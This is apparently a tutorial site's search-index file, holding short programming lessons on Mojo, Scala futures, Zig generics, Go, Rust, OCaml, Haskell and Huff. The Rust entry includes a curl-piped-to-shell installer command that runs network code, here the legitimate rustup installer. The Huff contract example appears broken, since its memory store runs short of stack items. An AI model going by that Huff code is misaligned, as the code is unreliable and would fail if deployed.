range(self.size): self.data.store(i, other.data.load(i)) var a = HeapArray(3, 1) a.dump() # [1, 1, 1] var b = a b.dump() # [1, 1, 1] Working with Structs and Methods link struct SomethingBig: var id_number: Int var huge: HeapArray fn __init__(inout self, id: Int): self.huge = HeapArray(1000, 0) self.id_number = id fn set_id(inout self, number: Int): self.id_number = number fn print_id(self): # Same as: fn print_id(borrowed self): print(self.id_number) fn use_something_big(borrowed a: SomethingBig, b: SomethingBig): a.print_id() b.print_id() let a = SomethingBig(10) let b = SomethingBig(20) use_something_big(a, b) Operator Overloading linkMojo supports operator overloading with methods like add and iadd.\nstruct MyInt: var value: Int #... (previous constructor and copy constructor) fn __add__(self, rhs: MyInt) -\u003e MyInt:return MyInt(self.value + rhs.value) fn __iadd__(inout self, rhs: Int): self = self + rhs var x: MyInt = 42 x += 1 print(x.value) # prints 43 Function Parameters and Mutability linkDemonstrating the use of inout for mutable parameters and function overloading.\nfn swap(inout lhs: Int, inout rhs: Int): let tmp = lhs lhs = rhs rhs = tmp var x = 42 var y = 12 swap(x, y) print(x, y) # Prints 12, 42 Unique Pointers and Ownership linkModeling unique pointer behavior in Mojo for advanced memory management.\nstruct UniquePointer: var ptr: Int fn __init__(inout self, ptr: Int): self.ptr = ptr fn __moveinit__(inout self, owned existing: Self): self.ptr = existing.ptr fn __del__(owned self): self.ptr = 0 fn take_ptr(owned p: UniquePointer): print(\"take_ptr\")print(p.ptr) fn use_ptr(borrowed p: UniquePointer): print(\"use_ptr\") print(p.ptr) fn work_with_unique_ptrs(): let p = UniquePointer(100) use_ptr(p) # borrowing function call take_ptr(p^) # passing ownership # use_ptr(p) # ERROR: p is no longer valid here! "
            }
        );
    index.add(
            {
                id:  122 ,
                href: "\/tutorials\/docs\/scala\/scala\/future_and_promises\/",
                title: "Future and Promises in Scala",
                description: "Futures provide a way to reason about performing many operations in parallel – in an efficient and non-blocking way.",
                content: "A Future is a placeholder object for a value that may not yet exist. Generally, the value of the Future is supplied concurrently and can subsequently be used. Composing concurrent tasks in this way tends to result in faster, asynchronous, non-blocking parallel code.\nBy default, futures and promises are non-blocking, making use of callbacks instead of typical blocking operations. To simplify the use of callbacks both syntactically and conceptually, Scala provides combinators such as flatMap, foreach, and filter used to compose futures in a non-blocking way. Blocking is still possible - for cases where it is absolutely necessary, futures can be blocked on (although this is discouraged).\nExecution Context linkFuture and Promises revolve around ExecutionContexts, responsible for executing computations.\nAn ExecutionContext is similar to an Executor: it is free to execute computations in a new thread, in a pooled thread or in the current thread (although executing the computation in the current thread is discouraged – more on that below).\nThe scala.concurrent package comes out of the box with an ExecutionContext implementation, a global static thread pool. It is also possible to convert an Executor into an ExecutionContext. Finally, users are free to extend the ExecutionContext trait to implement their own execution contexts, although this should only be done in rare cases.\nThe Global Execution Context linkExecutionContext.global is an ExecutionContext backed by a ForkJoinPool. It should be sufficient for most situations but requires some care. A ForkJoinPool manages a limited number of threads (the maximum number of threads being referred to as parallelism level). The number of concurrently blocking computations can exceed the parallelism level only if each blocking call is wrapped inside a blocking call (more on that below). Otherwise, there is a risk that the thread pool in the global execution context is starved, and no computation can proceed.\nBy default, the ExecutionContext.global sets the parallelism level of its underlying fork-join pool to the number of available processors (Runtime.availableProcessors). This configuration can be overridden by setting one (or more) of the following VM attributes:\nscala.concurrent.context.minThreads - defaults to 1 scala.concurrent.context.numThreads - can be a number or a multiplier (N) in the form ‘xN’ ; defaults to Runtime.availableProcessors scala.concurrent.context.maxThreads - defaults to Runtime.availableProcessors The parallelism level will be set to numThreads as long as it remains within [minThreads; maxThreads].\nAs stated above the ForkJoinPool can increase the number of threads beyond its parallelismLevel in the presence of blocking computation. As explained in the ForkJoinPool API, this is only possible if the pool is explicitly notified:\nimport scala.concurrent.{ Future, ExecutionContext } import scala.concurrent.forkjoin.* // the following is equivalent to `given ExecutionContext = ExecutionContext.global` import ExecutionContext.Implicits.global Future { ForkJoinPool.managedBlock( new ManagedBlocker { var done = false def block(): Boolean = try myLock.lock() // ... finally done = true true def isReleasable: Boolean = done } ) } Fortunately the concurrent package provides a convenient way for doing so:\nimport scala.concurrent.Future import scala.concurrent.blocking Future { blocking { myLock.lock() // ... } } Note that blocking is a general construct that will be discussed more in depth below.\nFutures linkA Future is an object holding a value which may become available at some point. This value is usually the result of some other computation:\nIf the computation has not yet completed, we say that the Future is not completed. If the computation has completed with a value or with an exception, we say that the Future is completed. Completion can take one of two forms:\nWhen a Future is completed with a value, we say that the future was successfully completed with that value. When a Future is completed with an exception thrown by the computation, we say that the Future was failed with that exception. A Future has an important property that it may only be assigned once. Once a Future object is given a value or an exception, it becomes in effect immutable – it can never be overwritten.\nThe simplest way to create a future object is to invoke the Future.apply method which starts an asynchronous computation and returns a future holding the result of that computation. The result becomes available once the future completes.\nNote that Future[T] is a type which denotes future objects, whereas Future.apply is a method which creates and schedules an asynchronous computation, and then returns a future object which will be completed with the result of that computation.\nThis is best shown through an example.\nLet’s assume that we want to use a hypothetical API of some popular social network to obtain a list of friends for a given user. We will open a new session and then send a request to obtain a list of friends of a particular user:\nimport scala.concurrent._ import ExecutionContext.Implicits.global val session = socialNetwork.createSessionFor(\"user\", credentials) val f: Future[List[Friend]] = Future { session.getFriends() } import scala.concurrent.* import ExecutionContext.Implicits.global val session = socialNetwork.createSessionFor(\"user\", credentials) val f: Future[List[Friend]] = Future { session.getFriends() } Above, we first import the contents of the scala.concurrent package to make the type Future visible. We will explain the second import shortly.\nWe then initialize a session variable which we will use to send requests to the server, using a hypothetical createSessionFor method. To obtain the list of friends of a user, a request has to be sent over a network, which can take a long time. This is illustrated with the call to the method getFriends that returns List[Friend]. To better utilize the CPU until the response arrives, we should not block the rest of the program – this computation should be scheduled asynchronously. The Future.apply method does exactly that – it performs the specified computation block concurrently, in this case sending a request to the server and waiting for a response.\nThe list of friends becomes available in the future f once the server responds.\nAn unsuccessful attempt may result in an exception. In the following example, the session value is incorrectly initialized, so the computation in the Future block will throw a NullPointerException. This future f is then failed with this exception instead of being completed successfully:\nval session = null val f: Future[List[Friend]] = Future { session.getFriends() } The line import ExecutionContext.Implicits.global above imports the default global execution context. Execution contexts execute tasks submitted to them, and you can think of execution contexts as thread pools. They are essential for the Future.apply method because they handle how and when the asynchronous computation is executed. You can define your own execution contexts and use them with Future, but for now it is sufficient to know that you can import the default execution context as shown above.\nOur example was based on a hypothetical social network API where the computation consists of sending a network request and waiting for a response. It is fair to offer an example involving an asynchronous computation which you can try out of the box. Assume you have a text file, and you want to find the position of the first occurrence of a particular keyword. This computation may involve blocking while the file contents are being retrieved from the disk, so it makes sense to perform it concurrently with the rest of the computation.\nval firstOccurrence: Future[Int] = Future { val source = scala.io.Source.fromFile(\"myText.txt\") source.toSeq.indexOfSlice(\"myKeyword\") } Callbacks linkWe now know how to start an asynchronous computation to create a new future value, but we have not shown how to use the result once it becomes available, so that we can do something useful with it. We are often interested in the result of the computation, not just its side-effects.\nIn many future implementations, once the client of the future becomes interested in its result, it has to block its own computation and wait until the future is completed – only then can it use the value of the future to continue its own computation. Although this is allowed by the Scala Future API as we will show later, from a performance point of view a better way to do it is in a completely non-blocking way, by registering a callback on the future. This callback is called asynchronously once the future is completed. If the future has already been completed when registering the callback, then the callback may either be executed asynchronously, or sequentially on the same thread.\nThe most general form of registering a callback is by using the onComplete method, which takes a callback function of type Try[T] =\u003e U. The callback is applied to the value of type Success[T] if the future completes successfully, or to a value of type Failure[T] otherwise.\nThe Try[T] is similar to Option[T] or Either[T, S], in that it is a monad potentially holding a value of some type. However, it has been specifically designed to either hold a value or some throwable object. Where an Option[T] could either be a value (i.e. Some[T]) or no value at all (i.e. None), Try[T] is a Success[T] when it holds a value and otherwise Failure[T], which holds an exception. Failure[T] holds more information than just a plain None by saying why the value is not there. In the same time, you can think of Try[T] as a special version of Either[Throwable, T], specialized for the case when the left value is a Throwable.\nComing back to our social network example, let’s assume we want to fetch a list of our own recent posts and render them to the screen. We do so by calling a method getRecentPosts which returns a List[String] – a list of recent textual posts:\nimport scala.util.{Success, Failure} val f: Future[List[String]] = Future { session.getRecentPosts() } f.onComplete { case Success(posts) =\u003e for post \u003c- posts do println(post) case Failure(t) =\u003e println(\"An error has occurred: \" + t.getMessage) } The onComplete method is general in the sense that it allows the client to handle the result of both failed and successful future computations. In the case where only successful results need to be handled, the foreach callback can be used:\nval f: Future[List[String]] = Future { session.getRecentPosts() } for { posts \u003c- f post \u003c- posts } println(post) val f: Future[List[String]] = Future { session.getRecentPosts() } for posts \u003c- f post \u003c- posts do println(post) Futures provide a clean way of handling only failed results using the failed projection which converts a Failure[Throwable] to a Success[Throwable]. An example of doing this is provided in the section below on projections.\nComing back to the previous example with searching for the first occurrence of a keyword, you might want to print the position of the keyword to the screen:\nval firstOccurrence: Future[Int] = Future { val source = scala.io.Source.fromFile(\"myText.txt\") source.toSeq.indexOfSlice(\"myKeyword\") } firstOccurrence.onComplete { case Success(idx) =\u003e println(\"The keyword first appears at position: \" + idx) case Failure(t) =\u003e println(\"Could not process file: \" + t.getMessage) } The onComplete and foreach methods both have result type Unit, which means invocations of these methods cannot be chained. Note that this design is intentional, to avoid suggesting that chained invocations may imply an ordering on the execution of the registered callbacks (callbacks registered on the same future are unordered).\nThat said, we should now comment on when exactly the callback gets called. Since it requires the value in the future to be available, it can only be called after the future is completed. However, there is no guarantee it will be called by the thread that completed the future or the thread which created the callback. Instead, the callback is executed by some thread, at some time after the future object is completed. We say that the callback is executed eventually.\nFurthermore, the order in which the callbacks are executed is not predefined, even between different runs of the same application. In fact, the callbacks may not be called sequentially one after the other, but may concurrently execute at the same time. This means that in the following example the variable totalA may not be set to the correct number of lower case and upper case a characters from the computed text.\n@volatile var totalA = 0 val text = Future { \"na\" * 16 + \"BATMAN!!!\" } text.foreach { txt =\u003e totalA += txt.count(_ == 'a') } text.foreach { txt =\u003e totalA += txt.count(_ == 'A') } Above, the two callbacks may execute one after the other, in which case the variable totalA holds the expected value 18. However, they could also execute concurrently, so totalA could end up being either 16 or 2, since += is not an atomic operation (i.e. it consists of a read and a write step which may interleave arbitrarily with other reads and writes).\nFor the sake of completeness the semantics of callbacks are listed here:\nRegistering an onComplete callback on the future ensures that the corresponding closure is invoked after the future is completed, eventually.\nRegistering a foreach callback has the same semantics as onComplete, with the difference that the closure is only called if the future is completed successfully.\nRegistering a callback on the future which is already completed will result in the callback being executed eventually (as implied by 1).\nIn the event that multiple callbacks are registered on the future, the order in which they are executed is not defined. In fact, the callbacks may be executed concurrently with one another. However, a particular ExecutionContext implementation may result in a well-defined order.\nIn the event that some callbacks throw an exception, the other callbacks are executed regardless.\nIn the event that some callbacks never complete (e.g. the callback contains an infinite loop), the other callbacks may not be executed at all. In these cases, a potentially blocking callback must use the blocking construct (see below).\nOnce executed, the callbacks are removed from the future object, thus being eligible for GC.\n"
            }
        );
    index.add(
            {
                id:  123 ,
                href: "\/tutorials\/docs\/zig\/zig\/generics\/",
                title: "Generics in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Generics Enter generics, the goal of which is to abstract algorithms and data structures from specific types.\nMany languages implement generics with special syntax and generic-specific rules. With Zig, generics are less of a specific feature and more of an expression of what the language is capable of. Specifically, generics leverage Zig’s powerful compile-time metaprogramming.\nWe’ll begin by looking at a silly example, just to get our bearings:\nconst std = @import(\"std\"); pub fn main() !void { var arr: IntArray(3) = undefined; arr[0] = 1; arr[1] = 10; arr[2] = 100; std.debug.print(\"{any}\\n\", .{arr}); } fn IntArray(comptime length: usize) type { return [length]i64; } The above prints { 1, 10, 100 }. The interesting part is that we have a function that returns a type (hence the function is PascalCase). Not just any type either, but a type based on a function parameter. This code only worked because we declared length as comptime. That is, we require anyone who calls IntArray to pass a compile-time known length parameter. This is necessary because our function returns a type and types must always be compile-time known.\nA function can return any type, not just primitives and arrays. For example, with a small change, we can make it return a structure:\nconst std = @import(\"std\"); pub fn main() !void { var arr: IntArray(3) = undefined; arr.items[0] = 1; arr.items[1] = 10; arr.items[2] = 100; std.debug.print(\"{any}\\n\", .{arr.items}); } fn IntArray(comptime length: usize) type { return struct { items: [length]i64, }; } It might seem odd, but arr’s type really is an IntArray(3). It’s a type like any other type and arr is a value like any other value. If we called IntArray(7) that would be a different type. Maybe we can make things neater:\nconst std = @import(\"std\"); pub fn main() !void { var arr = IntArray(3).init(); arr.items[0] = 1; arr.items[1] = 10; arr.items[2] = 100; std.debug.print(\"{any}\\n\", .{arr.items}); } fn IntArray(comptime length: usize) type { return struct { items: [length]i64, fn init() IntArray(length) { return .{ .items = undefined, }; } }; } At first glance that might not look neater. But besides being nameless and nested in a function, our structure’s looking like every other structure we’ve seen so far. It has fields, it has functions. You know what they say, if it looks like a duck…. Well, this looks, swims and quacks like a normal structure, because it is.\nWe’ve taken this route to get comfortable with a function that returns a type and the accompanying syntax. To get a more typical generic, we need to make one last change: our function has to take a type. In reality, this is a small change, but type can feel more abstract than usize, so we took it slowly. Let’s make a leap and modify our previous IntList to work with any type. We’ll start with a skeleton:\nfn List(comptime T: type) type { return struct { pos: usize, items: []T, allocator: Allocator, fn init(allocator: Allocator) !List(T) { return .{ .pos = 0, .allocator = allocator, .items = try allocator.alloc(T, 4), }; } }; } The above struct is almost identical to our IntList except i64 has been replaced with T. That T might seem special, but it’s just a variable name. We could have called it item_type. However, following Zig’s naming convention, variables of type type are PascalCase.\nFor good or bad, using a single letter to represent a type parameter is much older than Zig. T is a common default in most languages, but you will see context-specific variations, such as hash maps using K and V for their key and value parameter types. If you aren’t sure about our skeleton, consider the two places we use T: items: []T and allocator.alloc(T, 4). When we want to use this generic type, we’ll create an instance using:\nvar list = try List(u32).init(allocator); When the code gets compiled, the compiler creates a new type by finding every T and replacing it with u32. If we use List(u32) again, the compiler will re-use the type it previous created. If we specify a new value for T, say List(bool) or List(User), new types will be created.\nTo complete our generic List we can literally copy and paste the rest of the IntList code and replace i64 with T. Here’s a full working example:\nconst std = @import(\"std\"); const Allocator = std.mem.Allocator; pub fn main() !void { var gpa = std.heap.GeneralPurposeAllocator(.{}){}; const allocator = gpa.allocator(); var list = try List(u32).init(allocator); defer list.deinit(); for (0..10) |i| { try list.add(@intCast(i)); } std.debug.print(\"{any}\\n\", .{list.items[0..list.pos]}); } fn List(comptime T: type) type { return struct { pos: usize, items: []T, allocator: Allocator, fn init(allocator: Allocator) !List(T) { return .{ .pos = 0, .allocator = allocator, .items = try allocator.alloc(T, 4), }; } fn deinit(self: List(T)) void { self.allocator.free(self.items); } fn add(self: *List(T), value: T) !void { const pos = self.pos; const len = self.items.len; if (pos == len) { // we've run out of space // create a new slice that's twice as large var larger = try self.allocator.alloc(T, len * 2); // copy the items we previously added to our new space @memcpy(larger[0..len], self.items); self.allocator.free(self.items); self.items = larger; } self.items[pos] = value; self.pos = pos + 1; } }; } Our init function returns a List(T), and our deinit and add functions take a List(T) and *List(T). In our simple class, that’s fine, but for large data structures, writing the full generic name can become a little tedious, especially if we have multiple type parameters (e.g. a hash map that takes a separate type for its key and value). The @This() builtin function returns the innermost type from where it’s called. Most likely, our List(T) would be written as:\nfn List(comptime T: type) type { return struct { pos: usize, items: []T, allocator: Allocator, // Added const Self = @This(); fn init(allocator: Allocator) !Self { // ... same code } fn deinit(self: Self) void { // .. same code } fn add(self: *Self, value: T) !void { // .. same code } }; } Self isn’t a special name, it’s just a variable, and it’s PascalCase because its value is a type. We can use Self where we had previously used List(T).\nWe could create more complex examples, with multiple type parameters and more advanced algorithms. But, in the end, the core generic code would be no different than the simple examples above. In the next part we’ll touch on generics again when we look at the standard library’s ArrayList(T) and StringHashMap(V).\n"
            }
        );
    index.add(
            {
                id:  124 ,
                href: "\/tutorials\/docs\/golang\/golang\/getting-started-with-go\/",
                title: "Getting Started with Go",
                description: "Dive into Go programming with this comprehensive guide on its philosophy, setting up your development environment, and writing your first Go program. Perfect for beginners!",
                content: "Introduction:\nWelcome to the world of Go programming! Go, or Golang as it’s commonly called, is a programming language created by Google in 2007 with efficiency and readability in mind. Developed by programming legends such as Ken Thompson and Rob Pike, Go combines simplicity in syntax with the performance of compiled languages like C++. It’s used by developers around the world for everything from simple command-line tools to large-scale network servers and distributed systems. In this guide, we’ll explore what makes Go unique, set up your Go programming environment, and walk through creating your first basic Go program.\n1. Introduction to Go and Its Design Philosophy\nGo was designed to address some of the common frustrations developers face with other programming languages, including cumbersome module systems, slow compilation times, and difficulty in writing concurrent programs. Its design philosophy centers around simplicity, efficiency, readability, and productivity.\nSimplicity: Go has a minimalist design which makes it easy to learn. The syntax is clean and straightforward, which means you spend less time wrestling with the language itself and more time solving actual problems.\nEfficiency: Go is a compiled language, which means your code is directly translated into instructions that the computer’s CPU can execute, resulting in fast execution times.\nConcurrency: One of Go’s standout features is its built-in support for concurrent programming. With features like goroutines and channels, Go allows you to perform tasks concurrently, making efficient use of system resources.\nProductivity: Go includes a powerful standard library, robust tooling, and a built-in dependency management system, which all contribute to a productive development experience.\n2. Setting Up the Development Environment\nTo start coding in Go, you first need to set up your development environment. Here’s how you can get started:\na. Download and Install Go:\nVisit the official Go website and download the Go installer for your operating system. Follow the installation instructions specific to your OS. This typically involves running the downloaded installer. b. Verify the Installation:\nOpen a terminal or command prompt. Type go version and press enter. If Go is installed correctly, you should see the installed version of Go displayed in the terminal. c. Set Up Your Workspace:\nCreate a workspace directory where you will keep all your Go projects. For example, ~/go on Unix-like systems or C:\\go on Windows. Inside your workspace, create a directory called src where you will store the source files. 3. Writing Your First Go Program\nNow that you have your environment set up, let’s write a simple program to get a feel for Go.\nCreate a File:\nGo to the src directory in your workspace. Create a new file named hello.go. Write the Program:\nOpen hello.go in a text editor and type the following code: package main import \"fmt\" func main() { fmt.Println(\"Hello, world!\") } Run Your Program:\nOpen your terminal or command prompt. Navigate to the directory containing your hello.go file. Type go run hello.go and press enter. You should see “Hello, world!” printed in the console. Conclusion:\nCongratulations! You’ve just set up your Go development environment and written your first Go program. This is just the beginning of your journey with Go. The simplicity and power of Go make it a great choice for all kinds of projects, from small scripts to large systems. As you become more familiar with Go, you’ll start to appreciate its ability to simplify many aspects of programming, making you a more effective developer.\nStay tuned for more tutorials that will help you advance your Go programming skills and tackle more complex projects!\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How do I manage Go packages? A: Go comes with a built-in package management tool called go mod. To manage packages, you’ll generally declare your dependencies in a go.mod file in your project’s root directory, and Go will handle downloading and installing these dependencies for you.\nQ: Can I use Go for web development? A: Absolutely! Go is an excellent choice for building web servers and RESTful APIs. The standard library includes everything you need to get started with writing robust web services.\nQ: Are there any IDEs recommended for Go development? A: While you can use any text editor to write Go code, popular IDEs like Visual Studio Code, GoLand, and Atom offer excellent support for Go, including features like auto-completion, code navigation, and integrated debugging.\nFeel free to explore Go further and experiment with its features as you grow your programming skills!\n"
            }
        );
    index.add(
            {
                id:  125 ,
                href: "\/tutorials\/docs\/rust\/rust\/rust_introduction\/",
                title: "Getting Started with Rust",
                description: "A comprehensive introduction to Rust, detailing its advantages, installation, and initial setup with Cargo, Rust’s build system and package manager.",
                content: "Introduction to Rust linkRust is a systems programming language focused on three goals: safety, speed, and concurrency. It achieves these goals without having a garbage collector, making it a useful language for a number of use cases other languages aren’t as well suited for, such as embedding in other languages, programs with specific space and time requirements, and writing low-level code, like device drivers and operating systems.\nWhy Rust? linkChoosing Rust for your next project or learning it can provide numerous benefits:\nMemory Safety: Rust’s ownership model, coupled with its borrow checker, ensures safe memory access at all times, preventing common bugs like buffer overflows and null pointer dereferences. Concurrency Without Fear: Rust’s approach to concurrency is based on the concept of ‘fearless concurrency’, allowing you to write powerful multi-threaded applications without risking common concurrency pitfalls. Zero-Cost Abstractions: Rust allows you to abstract your code without a performance penalty. The abstractions you use compile to roughly the same code as if you wrote it in a lower-level language. Installing Rust and Setting Up the Environment linkInstallation linkTo start working with Rust, you first need to install the Rust toolchain. This includes rustc, the compiler, and Cargo, the package manager and build system.\nOn Windows link Download and install rustup by visiting https://rustup.rs/ and following the instructions for Windows. After installation, open a command prompt and type: rustc --version This command checks the installed version of Rust, confirming the installation. On macOS and Linux link Open a terminal and run the following command: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh Follow the on-screen instructions to complete the installation. Post-installation, verify it by executing: rustc --version Setting Up Cargo linkCargo is Rust’s build system and package manager. Most Rustaceans use Cargo because it handles a lot of tasks for you such as building your code, downloading the libraries your code depends on, and building those libraries.\nCreating a New Project linkTo create a new project with Cargo, run:\ncargo new my_project cd my_project This will create a new folder called my_project with a basic project structure:\nCargo.toml — the manifest file where you specify your dependencies and other project settings. src/main.rs — the entry point of your program. Building and Running a Project linkWithin your new project, you can build and run your project using:\ncargo build cargo run cargo build compiles your project, and cargo run builds and runs the compiled executable.\nConclusion linkYou’re now equipped with the basic knowledge to begin your journey into Rust programming. Up next, we’ll dive into Rust’s ownership model and explore how it contributes to the language’s safety features. Stay tuned for more!\n"
            }
        );
    index.add(
            {
                id:  126 ,
                href: "\/tutorials\/docs\/golang\/",
                title: "Golang",
                description: "Welcome back to your Go programming journey! As you start to feel more comfortable with the basics of Go, it's crucial to dive deeper into the core components that you will use in almost every Go program you write. This blog explores Go’s data types, variables, constants, basic operators, and control structures, providing a comprehensive guide to help you master the foundational concepts.",
                content: ""
            }
        );
    index.add(
            {
                id:  127 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/handling_command_arguments_in_ocaml\/",
                title: "Handling Command-Line Arguments in OCaml",
                description: "Learn how to handle command line arguments in ocaml",
                content: "In this tutorial, we will learn how to read command-line arguments directly using OCaml’s Sys.argv array and then how to simplify the process using the standard library’s Arg module.\nUsing Sys.argv linkLike in C and many other languages, the arguments passed to a program on the command line are stored in an array named argv. This array is found in the Sys module of the standard library and is referred to as Sys.argv. The number of arguments, including the program’s name, is obtained using the Array.length function.\nExample: Displaying Command-Line Arguments linkThe following program displays the arguments along with their position in Sys.argv:\nlet () = for i = 0 to Array.length Sys.argv - 1 do Printf.printf \"[%i] %s\\n\" i Sys.argv.(i) done Save the above code as args.ml, and run it as follows:\n$ ocaml args.ml arg1 arg2 arg3 [0] args.ml [1] arg1 [2] arg2 [3] arg3 Alternatively, you can compile your program and run it:\n$ ocamlopt -o args args.ml $ ./args arg1 arg2 arg3 [0] ./args [1] arg1 [2] arg2 [3] arg3 Using the Arg Module linkThe OCaml standard library includes the Arg module for handling command-line interfaces, which simplifies the process compared to using Sys.argv directly.\nExample: Appending Files linkWe’ll consider an example from the OCaml documentation: a program for appending files.\nStep 1: Define Usage Message linkSet up the usage message to be printed in case of a malformed command line or when help is requested:\nlet usage_msg = \"append [-verbose] [] ... -o \" Step 2: Create References linkCreate references to hold the information gathered from the command line. The Arg module will fill these in as the command line is read.\nlet verbose = ref false let input_files = ref [] let output_file = ref \"\" Step 3: Handle Anonymous Inputs linkDefine a function to handle the anonymous inputs (those with no flag). These will be our input file names.\nlet anon_fun filename = input_files := filename :: !input_files Step 4: Define Command-Line Specifications linkBuild the list of command-line flag specifications. Each is a tuple of the flag name, the action to be taken when encountered, and the help string.\nlet speclist = [ (\"-verbose\", Arg.Set verbose, \"Output debug information\"); (\"-o\", Arg.Set_string output_file, \"Set output file name\"); ] Step 5: Parse Command-Line Arguments linkCall Arg.parse, giving it the specification list, anonymous function, and usage message. Once it returns, the references will contain the required information.\nlet () = Arg.parse speclist anon_fun usage_msg (* Main functionality here *) Complete Program linkHere is the entire program:\nlet usage_msg = \"append [-verbose] [] ... -o \" let verbose = ref false let input_files = ref [] let output_file = ref \"\" let anon_fun filename = input_files := filename :: !input_files let speclist = [ (\"-verbose\", Arg.Set verbose, \"Output debug information\"); (\"-o\", Arg.Set_string output_file, \"Set output file name\"); ] let () = Arg.parse speclist anon_fun usage_msg; (* Main functionality here *) Compilation and Execution linkSave the program as append.ml, compile it, and try it out:\n$ ocamlopt -o append append.ml $ ./append -verbose one.txt two.txt -o three.txt $ ./append one.txt two.txt $ ./append -quiet ./append: unknown option '-quiet'. append [-verbose] [] ... -o -verbose Output debug information -o Set output file name -help Display this list of options --help Display this list of options $ ./append -help append [-verbose] [] ... -o -verbose Output debug information -o Set output file name -help Display this list of options --help Display this list of options Other Tools for Parsing Command-Line Options linkThere are libraries with more extensive facilities than the built-in Arg module:\nCmdliner: A modern interface for command line processing, which also generates UNIX man pages automatically. Clap: An imperative command line parser. Minicli: Supports rejecting malformed command lines that others might silently accept. Getopt for OCaml: Similar to GNU getopt. By using these tools, you can handle complex command-line interfaces efficiently in OCaml.\n"
            }
        );
    index.add(
            {
                id:  128 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/concurrency-and-parallelism-in-haskell\/",
                title: "Harnessing Concurrency and Parallelism in Haskell",
                description: "Explore the essentials of concurrent and parallel programming in Haskell. Learn how to effectively use threads, asynchronous operations, and strategies for maximizing parallelism.",
                content: "Introduction: linkWelcome back to our Haskell series, where today we’re diving into the world of concurrency and parallelism. Haskell offers robust support for concurrent and parallel programming, allowing developers to write high-performance applications that make full use of modern multicore processors. In this post, we’ll cover the basics of concurrent programming in Haskell, discuss how to use threads and asynchronous operations, and explore strategies for effective parallel programming. Understanding these concepts will enable you to design and implement applications that are not only fast but also scalable.\nBasics of Concurrent Programming in Haskell linkConcurrency in Haskell:\nConcurrency in Haskell is primarily about dealing with multiple computations that run overlapped or simultaneously, potentially interacting with each other. Haskell provides several abstractions to handle concurrency gracefully, ensuring that programs remain composable and maintainable.\nLightweight Threads: Haskell’s runtime system supports lightweight threads, which are managed in user space rather than by the operating system. These threads can be spawned very cheaply, and many thousands can exist simultaneously without significant overhead.\nimport Control.Concurrent (forkIO) main :: IO () main = do forkIO $ putStrLn \"Hello from a thread!\" putStrLn \"Hello from the main thread!\" Using Threads and Asynchronous Operations linkWorking with Asynchronous Operations:\nAsynchronous operations are crucial for performing non-blocking tasks, such as I/O operations or inter-thread communication. Haskell’s async package provides a high-level interface for asynchronous actions.\nUsing Async for Concurrency:\nimport Control.Concurrent.Async main :: IO () main = do a1 \u003c- async $ computeIntensiveTask 1 a2 \u003c- async $ computeIntensiveTask 2 result1 \u003c- wait a1 result2 \u003c- wait a2 print (result1, result2) This pattern allows multiple tasks to run in parallel, improving throughput and responsiveness of applications.\nStrategies for Effective Parallel Programming linkParallelism in Haskell:\nWhile concurrency is about structure and dealing with lots of things at once, parallelism in Haskell is used to perform computations faster by dividing work across multiple processors.\nUsing par and pseq: Haskell provides explicit parallelism constructs such as par and pseq to help with specifying parallel computations. par is used to suggest that its argument could be evaluated in parallel with another, and pseq forces the order of evaluation.\nimport Control.Parallel parExample :: Int -\u003e Int -\u003e Int parExample x y = x `par` y `pseq` x + y Parallel Strategies: The parallel package offers combinators that abstract over common patterns of parallel usage. This allows you to focus more on what computations to parallelize rather than on low-level threading details.\nimport Control.Parallel.Strategies parallelMap :: (a -\u003e b) -\u003e [a] -\u003e [b] parallelMap f xs = map f xs `using` parList rdeepseq Conclusion:\nConcurrency and parallelism are powerful tools in Haskell’s arsenal, enabling developers to write high-performance applications that leverage multicore processors efficiently. By understanding and applying the concepts and techniques discussed, you can significantly enhance the performance and responsiveness of your Haskell programs.\nFrequently Asked Questions:\nQ: How do I choose between concurrency and parallelism for a specific problem? A: Concurrency is typically used for tasks that involve a lot of waiting, such as web servers or user interfaces, whereas parallelism is suitable for computationally intensive tasks that can be divided into independent units of work.\nQ: Are there any common pitfalls in parallel programming in Haskell? A: Common pitfalls include overusing parallelism, leading to contention and reduced performance, and incorrect assumptions about the independence of tasks, which can result in subtle bugs or incorrect results.\n"
            }
        );
    index.add(
            {
                id:  129 ,
                href: "\/tutorials\/docs\/haskell\/",
                title: "Haskell",
                description: " Welcome to the intriguing world of Haskell, a language that embodies the essence of functional programming with its emphasis on purity and immutability. If you're drawn to Haskell, you're likely intrigued by its elegance and robustness in tackling complex problems through simple, declarative code constructs.",
                content: ""
            }
        );
    index.add(
            {
                id:  130 ,
                href: "\/tutorials\/docs\/huff\/huff\/writing_your_first_huff_contract\/",
                title: "Hello World using Huff",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Writing Your First Huff Contract linkStructure of a Huff Contract linkHuff contracts, at their core, are a series of EVM opcodes and macros. The structure is significantly more straightforward than a typical Solidity contract. A basic Huff contract typically contains:\nDeclarations: Declaring macros and data storage locations. Macros: Macros are reusable code blocks in Huff. Main Execution Logic: The primary logic of the contract, often written using a combination of EVM opcodes and macros. Basic Syntax and Commands linkHuff syntax is minimalistic, focusing on direct manipulation of the EVM stack. Here are some key components:\nMacros: Defined using #define, macros are a powerful feature for code reusability. Storage and Memory Operations: Directly manipulate storage and memory with EVM opcodes. Control Flow: Utilize opcodes like JUMP, JUMPI, PUSH, etc., for control flow. Code Example: A Simple “Hello World” Contract linkLet’s create a simple contract in Huff that stores a value and allows it to be retrieved.\n#define macro MAIN() = takes (0) returns (0) { // Store the value 123 at storage location 0 123 0 sstore // Retrieve and return the value from storage location 0 0 sload mstore 32 0 return } // The entry point of the contract #define macro JUMPDEST_MAIN() = takes (0) returns (0) { MAIN() } This contract stores the number 123 in the first storage slot and retrieves it when called. The macros MAIN and JUMPDEST_MAIN encapsulate the contract’s logic.\nCompiling and Deploying the Contract linkAfter writing the contract, use the Huff compiler to compile it:\nhuffc your_contract.huff --bytecode Then, deploy the compiled bytecode to the Ethereum network using Truffle or Hardhat.\n"
            }
        );
    index.add(
            {
                id:  131 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/cleaning_data_using_panda\/",
                title: "How to Clean Data using Pandas",
